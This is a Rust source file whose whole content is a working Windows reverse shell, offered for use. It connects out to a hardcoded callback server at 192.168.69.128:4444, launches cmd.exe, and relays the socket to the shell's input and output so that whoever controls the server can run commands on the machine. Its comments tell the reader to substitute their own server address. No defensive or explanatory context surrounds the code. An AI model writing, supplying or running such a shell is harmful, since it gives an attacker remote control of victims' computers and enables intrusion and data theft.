use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;

fn main() -> std::io::Result<()> {
    // 1. Connect back to your callback server (replace with your server’s IP/port):
    let server_addr = "192.168.69.128:4444";
    let mut stream = TcpStream::connect(server_addr)?;
    // At this point `stream` is a live TCP connection to the server.

    // 2. Spawn cmd.exe with piped stdin/stdout/stderr:
    let mut child = Command::new("cmd.exe")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;
    // Grab handles for the child’s stdio:
    let mut child_stdin  = child.stdin.take().unwrap();
    let mut child_stdout = child.stdout.take().unwrap();
    let mut child_stderr = child.stderr.take().unwrap();

    // 3. Bridge socket → child_stdin:
    {
        let mut stream_reader = stream.try_clone()?;
        thread::spawn(move || {
            let mut buf = [0u8; 1024];
            loop {
                match stream_reader.read(&mut buf) {
                    Ok(0) | Err(_) => break, // connection closed or error
                    Ok(n) => {
                        // Write anything we receive from the server into cmd.exe’s stdin
                        if child_stdin.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                }
            }
        });
    }

    // 4. Bridge child_stdout → socket:
    {
        let mut stream_writer = stream.try_clone()?;
        thread::spawn(move || {
            let mut buf = [0u8; 1024];
            loop {
                match child_stdout.read(&mut buf) {
                    Ok(0) | Err(_) => break, // cmd.exe exited or error
                    Ok(n) => {
                        // Send cmd.exe’s stdout back over the socket
                        if stream_writer.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                }
            }
        });
    }

    // 5. Bridge child_stderr → socket:
    {
        // We can reuse the original `stream` here for stderr
        thread::spawn(move || {
            let mut buf = [0u8; 1024];
            loop {
                match child_stderr.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        // Send cmd.exe’s stderr back over the socket
                        if stream.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                }
            }
        });
    }

    // 6. Wait for cmd.exe to exit (or Ctrl-C kills this process):
    child.wait()?;
    Ok(())
}
